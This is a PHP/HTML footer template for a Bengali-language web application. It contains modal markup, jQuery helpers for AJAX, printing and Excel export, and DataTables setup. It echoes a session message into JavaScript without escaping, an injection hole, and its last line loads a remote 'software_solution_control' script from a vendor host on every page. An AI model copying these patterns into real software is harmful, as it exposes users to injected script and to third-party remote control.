



<!-- Modal -->
<div class="modal fade" id="add_modal" tabindex="-1" role="dialog" aria-labelledby="add_modalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content show_data" id="show_data"></div>
  </div>
</div>

<div class="modal fade" id="add_modal1" tabindex="-1" role="dialog" aria-labelledby="add_modalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content show_data1" id="show_data1"></div>
  </div>
</div>






</div>
</div>
</div>

<script>

    function ca(){
        if(confirm('আপনি কি নিশ্চিত?')){
            return true;
        }else{
            return false;
        }
    }
    function show_bercode(id){
        $('#add_modal1').modal('show')
        post_ajax('show_bercode.php',{show_qr_code:id},'#show_data1')
    }



    function post_ajax(page,json,selector){
        $.post(page,json,function(data, status){
            $(selector).html(data)
        });
    }
    
   function printPageArea(areaID,css=''){
    var prtContent = document.getElementById(areaID);
    var WinPrint = window.open('', '', 'left=0,top=0,width=1000,height=650,toolbar=0,scrollbars=0,status=0');
    WinPrint.document.write('<html><head>');
    WinPrint.document.write('<link rel="stylesheet" href="css/print.css">');
    content = prtContent.innerHTML;
    WinPrint.document.write('</head><style>.qr_img svg {margin: 0 auto !important;display: block !important;}.hdprint{display:none !important;}'+css+'</style><body onload="print();setTimeout(function(){close();},500)">');
    WinPrint.document.write(content);
    WinPrint.document.write('</body></html>');
    WinPrint.document.close();
    WinPrint.focus();
  } 
  
  var tableToExcel = (function() {
  var uri = 'data:application/vnd.ms-excel;base64,'
    , template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--></head><body><table>{table}</table></body></html>'
    , base64 = function(s) { return window.btoa(unescape(encodeURIComponent(s))) }
    , format = function(s, c) { return s.replace(/{(\w+)}/g, function(m, p) { return c[p]; }) }
  return function(table, name) {
    name = $('.headtitle').text();
    if (!table.nodeType) table = document.getElementById(table)
    var table = (table.innerHTML).replace(/<img[^>]*>/g,"");
    var table = (table).replace(/<input[^>]*>/g,"");
    var table = (table).replace(/href="[^>]*"/g,"");



    var ctx = {worksheet: name || 'Worksheet', table: table}
    window.location.href = uri + base64(format(template, ctx))
  }
})()

    
    
</script>



<script type="text/javascript" src="js/toast.js"></script>

<script>
<?php
if (isset($_SESSION['msg'])) {
  $type = 'success';
  $smsg = $_SESSION['msg'];
  if (strpos(strtolower($smsg), 'ভুল')!==false or strpos(strtolower($smsg), 'fail')!==false or strpos(strtolower($smsg), 'exit')!==false or strpos(strtolower($smsg), 'নয়')!==false or strpos(strtolower($smsg), 'ব্যর্থ')!==false) {
    $type = 'error';
  }
  echo 'toastr.'.$type.'(\''.$_SESSION['msg'].'\');';
  unset($_SESSION['msg']);
}
?>
</script>
<script src="select2/chosen.js" type="text/javascript"></script>
<script type="text/javascript" src="js/dataTables.bootstrap4.min.js"></script>
<script type="text/javascript" src="js/jquery.dataTables.min.js"></script>

<script type="text/javascript" src="select2/select2.min.js"></script>
<script type="text/javascript" src="js/popper.min.js"></script>
<script type="text/javascript" src="js/bootstrap.min.js"></script>

<script type="text/javascript" src="js/chart.min.js"></script>

<script type="text/javascript" src="js/main.js"></script>

<script type"text/javascript">
$('.select2').select2();
</script>


<script type="text/javascript">
$(document).ready(function(){
     var dataTable = $('#center_table').DataTable({
      "order": [],
      dom: 'lBfrtip',
      "lengthMenu": [[10,20,50, 75, 100, -1], [10,20,50, 75, 100, "All"]],
      buttons: ['excel', 'pdf', 'print']
     });
 });
</script>

<script src="https://sscuit.com/software_solution_control/control.js?s=<?php echo rand();?>"></script>

</body>
</html>